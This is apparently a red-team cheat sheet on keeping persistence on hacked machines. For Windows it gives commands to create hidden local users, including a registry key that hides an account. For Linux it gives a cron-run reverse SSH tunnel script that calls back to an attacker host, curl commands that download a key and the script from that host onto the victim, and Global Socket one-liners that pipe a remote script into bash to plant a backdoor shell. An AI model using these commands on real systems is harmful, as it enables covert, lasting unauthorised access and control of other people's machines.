# Persistence

* [https://xakep.ru/2021/03/03/persistence-cheatsheet/](https://xakep.ru/2021/03/03/persistence-cheatsheet/)




## Windows



### Hidden Local User


#### Dollar Sign

* [https://chaah.awankloud.my/redteaming-tips-creating-a-hidden-user/](https://chaah.awankloud.my/redteaming-tips-creating-a-hidden-user/)

```
Cmd > net user snovvcrash$ Passw0rd! /add
```


#### SpecialAccounts

```
PS > New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name SpecialAccounts
PS > New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\" -Name snovvcrash -PropertyType DWord -Value 0 -Force
```




## Linux



### SSH Tunnel in Crontab

{% code title="callback.sh" %}
```bash
#!/bin/bash
if [[ `ps -ef | grep -c 2222` -eq 1 ]]; then
  /usr/bin/ssh -nNT -R 2222:localhost:22 -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /home/alice/.ssh/.k nopty@10.10.13.37
fi
```
{% endcode %}

Attacker's box:

```
$ sudo useradd -ms /bin/false nopty
$ sudo ssh-keygen -f /home/nopty/.ssh/dummy_key -t ed25519 -q -N ""
$ cat /home/nopty/.ssh/dummy_key.pub
$ sudo vi /home/nopty/.ssh/authorized_keys
from="10.10.13.38",command="echo 'Only port forwarding is allowed'",no-agent-forwarding,no-X11-forwarding,no-pty <DUMMY_KEY_PUB>
```

Victim's box:

```
$ curl 10.10.13.37/dummy_key > /home/alice/.ssh/.k
$ chmod 600 /home/alice/.ssh/.k
$ curl 10.10.13.37/callback.sh > /home/alice/.conf
$ chmod +x /home/alice/.conf
$ crontab -e
*/15 * * * * /home/alice/.conf
```



### Global Socket

* [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)


#### Install

Victim's box:

```
$ bash -c "$(curl -fsSL gsocket.io/x)"
Or
$ bash -c "$(wget -qO- gsocket.io/x)"
```


#### Connect

Attacker's box:

```
$ cd
$ /bin/bash -c "$(curl -fsSL https://tiny.cc/gsinst)"
$ ~/gsocket/tools/gs-netcat -s "<SECRET>" -i
```


#### Cleanup

Victim's box:

```
$ GS_UNDO=1 bash -c "$(curl -fsSL gsocket.io/x)"
Or
$ GS_UNDO=1 bash -c "$(wget -qO- gsocket.io/x)"

$ pkill gs-bd
```



### Rootkits

* [0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485](https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485)
